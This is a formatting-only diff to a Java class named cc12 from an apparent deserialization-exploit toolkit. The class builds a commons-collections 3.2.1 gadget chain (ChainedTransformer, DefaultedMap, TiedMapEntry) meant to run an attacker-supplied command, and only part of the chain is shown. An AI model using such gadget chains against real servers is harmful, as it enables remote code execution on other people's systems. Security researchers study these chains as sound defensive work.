@@ -4,10 +4,9 @@ import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Reflections;
 import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
-
+import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.DefaultedMap;
 
@@ -18,11 +17,11 @@ import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
 @Authors({Authors.Jayl1n})
-public class cc12 implements ObjectPayload<Object>{
+public class cc12 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         final Transformer transformerChain = new ChainedTransformer(
-                new Transformer[]{ new ConstantTransformer(1) });
+                new Transformer[]{new ConstantTransformer(1)});
         final Transformer[] transformers = TransformerUtil.makeTransformer(command);
         final Map innerMap = new HashMap();
         final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);
